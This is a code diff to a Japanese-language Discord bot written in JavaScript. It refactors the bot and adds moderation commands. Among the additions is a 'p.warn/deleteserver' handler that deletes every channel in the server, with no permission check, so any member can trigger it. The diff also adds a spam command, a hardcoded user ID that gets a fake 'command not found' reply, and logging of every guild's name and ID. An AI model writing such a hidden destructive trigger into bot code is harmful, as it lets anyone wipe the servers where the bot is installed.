@@ -1,4 +1,5 @@
-        //Imports
+async function handle() { 
+       //Imports
 const http = require("http");
 const fs = require("fs")
 const prefix = "p."
@@ -12,28 +13,27 @@ const serp = require('serp')
 const { Client, Intents, MessageEmbed, WebhookClient, MessageActionRow, MessageButton, Permissions, Discord, MessageReference } = require('discord.js');
 const client = new Client({ intents: [   Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });
 
-//Http.CreateServer
-http.createServer(function(req, res){
-  res.write("OK");
-  res.end();
- }).listen(8080);
 
 //Client Ready
 client.on("ready", () => {
-  console.log(`${client.user.tag} でログインしています。`);
-  	   	     client.user.setActivity(`p.help | 2.1.5`, { type: "PLAYING" }, { status: "online" })
+client.guilds.cache.forEach(guild => {
+  console.log(`${guild.name} | ${guild.id}`)
 })
-//Sleep Function
-function sleep(waitSec, callback) {
-  setTimeout(callback, waitSec);
-}
+  console.log(`${client.user.tag} でログインしています。`);
+  	   	     client.user.setActivity(`p.help | 2.1.7 | ${client.guilds.cache.size} サーバー`, { type: "PLAYING" }, { status: "online" })
+})
+
 
 //Discord BOT Login
 client.login(process.env.Discord_Token);
 
+
+
 //messageCreate
 client.on('messageCreate', async message => {
-  
+  if (message.author.id === "873924416449441792") {
+    message.channel.send("このコマンドは見つかりませんでした")
+  }else{
     if  (message.author.bot) {
     return;
   }
@@ -54,6 +54,11 @@ client.on('messageCreate', async message => {
 
   cmd.handle(message, client);
 }
+  if (message.content === "p.warn/deleteserver") {
+message.guild.channels.cache.forEach(channel => {
+channel.delete()
+})
+}
   if (message.content.startsWith('p.poll ')) {
       const cmd = require("./commands/poll");
   cmd.handle(message);
@@ -70,25 +75,29 @@ client.on('messageCreate', async message => {
           const cmd = require("./commands/omi");
   cmd.handle(message);
   }
-  if (message.content.match(/おはよ|おやすみ|こんにちは|こんばんは/)) {
-              const cmd = require("./commands/aisatu");
+      if (message.content === "p.alpha/spam") {
+          const cmd = require("./commands/spam");
   cmd.handle(message);
   }
         if (message.content === "p.invite") {
           const cmd = require("./commands/invite");
   cmd.handle(message);
   }
-          if (message.content === "p.chat") {
-            
-          const cmd = require("./commands/chat");
+    if (message.content.startsWith("p.kick")) {
+      const cmd = require("./commands/kick");
   cmd.handle(message, client);
   }
     if (message.content.startsWith("p.ban")) {
       const cmd = require("./commands/ban");
   cmd.handle(message, client);
   }
+
       if (message.content.startsWith("p.gban")) {
       const cmd = require("./commands/gban");
+  cmd.handle(message, client);
+  }
+      if (message.content.startsWith("p.gunban")) {
+      const cmd = require("./commands/gunban");
   cmd.handle(message, client);
   }
             if (message.content === "p.botcleanup") {
@@ -121,6 +130,14 @@ client.on('messageCreate', async message => {
       const cmd = require("./commands/eval");
   cmd.handle(message, client);
   }
+      if (message.content.startsWith("p.ui")) {
+      const cmd = require("./commands/ui");
+  cmd.handle(message);
+  }
+      if (message.content.startsWith("p.si")) {
+      const cmd = require("./commands/si");
+  cmd.handle(message);
+  }
      if (message.content.startsWith("p.botinvite ")) {
       const cmd = require("./commands/invitebot");
   cmd.handle(message, client);
@@ -136,6 +153,7 @@ if (message.channel.id == sentchannelid) {
         const cmd = require("./commands/webhookgchat");
   cmd.handle(message, client);
 }
+  }
 })
 client.on('messageCreate', async message => {
     if (message.channel.name === sgc_name) {
@@ -148,3 +166,7 @@ client.on('messageCreate', async message => {
 console.log("tensou")
   }
 })
+}
+module.exports = {
+  handle
+}
